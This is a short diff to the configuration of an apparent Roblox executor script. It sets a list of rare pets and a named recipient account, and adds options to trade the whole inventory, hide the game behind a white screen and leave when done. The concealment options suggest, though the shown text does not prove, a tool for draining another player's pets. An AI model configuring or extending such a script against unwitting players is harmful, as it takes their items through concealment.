@@ -7,7 +7,15 @@ task.wait(10)
 
 getgenv().Configuration = {
     petToGive = {
-        "Fluffy",
+        "Cockatrice",
+        "Dragonfly",
+        "Golden Goose",
+        "Red Fox",
+        "Lobster Thermidor",
+        "Griffin"
     },
-    targetUsername = "TargetUser123"
+    targetUsername = "Seth_Nooby1",
+    tradeWholeInventory = false, -- true = trade all pets in inventory, false = only trade pets in petToGive list
+    whiteScreen = false, -- true = white screen mode, false = normal UI
+    leaveWhenDone = false, -- true = leave game when finished, false = stay in game
 }
